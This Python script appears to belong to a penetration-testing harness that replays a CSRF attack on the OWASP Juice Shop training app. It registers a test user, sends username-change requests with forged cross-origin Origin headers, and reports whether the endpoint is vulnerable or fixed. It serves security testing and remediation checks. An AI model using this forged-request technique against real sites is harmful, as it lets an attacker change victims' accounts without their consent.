#!/usr/bin/env python3
"""pt13: CSRF on the username-update endpoint.

POST /profile changes the logged-in user's username, authenticated
purely by the "token" cookie. No anti-CSRF token is required, and the
Origin/Referer headers are read only for Juice Shop's own scoreboard
tracking, never enforced as an actual check. A forged, clearly
cross-origin Origin header still gets the request through.

Juice Shop's own "CSRF" scoreboard entry wants the themed origin from
its official walkthrough (htmledit.squarefree.com); this scenario
checks the general case first (any forged origin) since that's the
real vulnerability, then separately confirms the themed one for
corroboration.

Standard library only (urllib, base64, json, http.cookies).
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from http.cookies import SimpleCookie
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt13-001.json"


class _NoRedirect(urllib.request.HTTPErrorProcessor):
    def http_response(self, request, response):
        return response  # don't let 302 be swallowed as a followed redirect

    https_response = http_response


_opener = urllib.request.build_opener(_NoRedirect)


def _jwt_payload(token: str) -> dict:
    payload_b64 = token.split(".")[1]
    padded = payload_b64 + "=" * (-len(payload_b64) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))


def _register_and_login(target: str, stamp: str) -> str:
    email = f"pt13-{stamp}@flatline.test"
    password = "Pt13Pass123!"
    reg_req = urllib.request.Request(
        f"{target}/api/Users",
        data=json.dumps({"email": email, "password": password, "passwordRepeat": password}).encode(),
        method="POST",
    )
    reg_req.add_header("Content-Type", "application/json")
    urllib.request.urlopen(reg_req, timeout=10).read()

    login_req = urllib.request.Request(
        f"{target}/rest/user/login",
        data=json.dumps({"email": email, "password": password}).encode(),
        method="POST",
    )
    login_req.add_header("Content-Type", "application/json")
    body = json.loads(urllib.request.urlopen(login_req, timeout=10).read())
    return body["authentication"]["token"]


def _forged_profile_update(target: str, token: str, origin: str, username: str):
    req = urllib.request.Request(
        f"{target}/profile",
        data=urllib.parse.urlencode({"username": username}).encode(),
        method="POST",
    )
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("Cookie", f"token={token}")
    req.add_header("Origin", origin)
    try:
        with _opener.open(req, timeout=10) as resp:
            status = resp.status
            set_cookie = resp.headers.get("Set-Cookie", "")
    except urllib.error.HTTPError as exc:
        status = exc.code
        set_cookie = exc.headers.get("Set-Cookie", "") if exc.headers else ""

    new_username = None
    if set_cookie:
        cookie = SimpleCookie()
        cookie.load(set_cookie)
        if "token" in cookie:
            new_username = _jwt_payload(cookie["token"].value).get("data", {}).get("username")
    return status, new_username


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    token = _register_and_login(target, stamp)

    exploit_status, exploit_username = _forged_profile_update(
        target, token, f"https://{blueprint['forged_origin_generic_host']}", "pt13-csrf-forged-username"
    )

    if exploit_status == 403:
        status = "REMEDIATED"
        summary = f"Blocked with HTTP {exploit_status}."
    elif exploit_status in (200, 302) and exploit_username == "pt13-csrf-forged-username":
        status = "VULNERABLE"
        summary = "A forged, cross-origin request with no CSRF token changed the username anyway."
    else:
        status = "ERROR"
        summary = f"Inconclusive: HTTP {exploit_status}, username={exploit_username!r}."

    same_origin = target  # whichever host is actually being tested, backend or proxy
    legit_status, legit_username = _forged_profile_update(target, token, same_origin, "pt13-legit-same-origin-username")
    legitimate_same_origin_ok = legit_status in (200, 302) and legit_username == "pt13-legit-same-origin-username"

    themed_status, themed_username = _forged_profile_update(
        target, token, f"https://{blueprint['forged_origin_themed_host']}", "pt13-csrf-themed-username"
    )
    themed_origin_also_works = themed_status in (200, 302) and themed_username == "pt13-csrf-themed-username"

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "exploit_http_status": exploit_status,
        "summary": summary,
        "legitimate_same_origin_ok": legitimate_same_origin_ok,
        "themed_origin_also_works": themed_origin_also_works,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt13-csrf-profile-update", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
